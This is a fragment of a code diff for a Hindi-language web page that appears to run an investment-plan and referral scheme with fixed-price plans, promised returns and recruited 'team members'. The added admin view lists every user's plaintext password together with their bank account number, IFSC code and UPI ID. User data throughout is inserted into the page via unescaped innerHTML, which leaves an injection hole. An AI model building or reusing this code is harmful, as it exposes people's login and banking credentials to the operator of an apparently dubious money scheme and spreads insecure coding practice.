+      tbody.innerHTML = '';
+
+      let freshUsersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
+
+      if (freshUsersDB.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;">कोई यूजर नहीं है</td></tr>';
+        return;
+      }
+
+      freshUsersDB.forEach(user => {
+        let bankInfo = "<span style='color:red;'>बैंक नहीं जोड़ा</span>";
+        if (user.bankDetails) {
+          bankInfo = `<b>नाम:</b> ${user.bankDetails.holder}<br><b>खाता:</b> ${user.bankDetails.acc}<br><b>IFSC:</b> ${user.bankDetails.ifsc}<br><b>UPI:</b> ${user.bankDetails.upi || 'N/A'}`;
+        }
+
+        tbody.innerHTML += `
+          <tr>
+            <td><b>ID:</b> ${user.uniqueId}<br><b>Name:</b> ${user.name}</td>
+            <td>${user.phone}<br>${user.email}</td>
+            <td><code style="background:#eee; padding:2px 4px;">${user.password}</code></td>
+            <td>${bankInfo}</td>
+          </tr>
+        `;
+      });
     }
 
     function switchTab(name, el) {
@@ -510,65 +296,10 @@
       document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
       document.getElementById('tab-' + name).classList.add('active-sec');
       el.classList.add('active');
-    }
-
-    function logoutUser() { localStorage.removeItem("currentUser"); location.reload(); }
-
-    function showPortal() {
-      document.getElementById("auth-section").style.display = "none";
-      document.getElementById("portal-container").style.display = "block";
-      document.getElementById("user-balance").innerText = currentUser.balance.toFixed(2);
-      document.getElementById("profile-phone").innerText = currentUser.phone;
-      document.getElementById("profile-uid").innerText = currentUser.uniqueId;
-      document.getElementById("referral-link-text").innerText = `${window.location.origin}${window.location.pathname}?ref=${currentUser.uniqueId}`;
-      
-      if(!currentUser.purchasedPlans) currentUser.purchasedPlans = [];
-      
-      // Update plan buttons based on purchase status
-      const planPrices = [180, 380, 800, 1800, 3500, 7000];
-      planPrices.forEach(p => {
-        let btn = document.getElementById("btn-plan-" + p);
-        if(btn) {
-          if(currentUser.purchasedPlans.includes(p)) {
-            btn.innerText = "Already Purchased ❌";
-            btn.classList.add("btn-disabled");
-          } else {
-            btn.classList.remove("btn-disabled");
-          }
-        }
-      });
-
-      let tList = document.getElementById("team-members-list");
-      tList.innerHTML = (currentUser.teamMembers && currentUser.teamMembers.length > 0) ? 
-        currentUser.teamMembers.map(m => `<div style="padding:6px 0; border-bottom:1px solid #eee;"><b>${m.name}</b> (${m.phone})</div>`).join('') : "Abhi koi team member nahi hai.";
-
-      // Active Plan UI display
-      let activePlanDiv = document.getElementById("active-plan-status");
-      if(currentUser.activePlan) {
-        activePlanDiv.innerHTML = `<b>${currentUser.activePlan.name}</b><br>• Invested: ₹${currentUser.activePlan.price}<br>• Total Return: ₹${currentUser.activePlan.returnAmount}<br>• Duration: ${currentUser.activePlan.duration}<br>• Time: ${currentUser.activePlan.purchasedDate}`;
-      } else {
-        activePlanDiv.innerHTML = "Koi bhi plan active nahi hai. Home se plan invest karein.";
-      }
-
-      let hList = document.getElementById("my-products-list");
-      hList.innerHTML = (currentUser.history && currentUser.history.length > 0) ?
-        currentUser.history.map(h => `<div style="background:#fff; padding:10px; border-radius:6px; margin-bottom:8px; border:1px solid #ddd;"><b>${h.type}</b>: ${h.details} <br><span style="font-size:11px; color:#666;">Status: ${h.status}</span></div>`).join('') : "Koi record nahi hai.";
-
-      let bStatus = document.getElementById("bank-status-text");
-      if(currentUser.bankDetails) {
-        bStatus.innerHTML = `<b>Holder:</b> ${currentUser.bankDetails.holder}<br><b>Acc No:</b> ${currentUser.bankDetails.acc}<br><b>IFSC:</b> ${currentUser.bankDetails.ifsc}`;
+      if(name === 'admin') {
+        loadAdminTable();
       }
     }
-
-    function updateStorage() {
-      usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
-      let idx = usersDB.findIndex(u => u.email === currentUser.email);
-      if(idx !== -1) usersDB[idx] = currentUser;
-      localStorage.setItem("usersDB", JSON.stringify(usersDB));
-      localStorage.setItem("currentUser", JSON.stringify(currentUser));
-      showPortal();
-    }
-    function copyReferralLink() { navigator.clipboard.writeText(document.getElementById("referral-link-text").innerText); alert("Referral Link Copied!"); }
   </script>
 </body>
 </html>
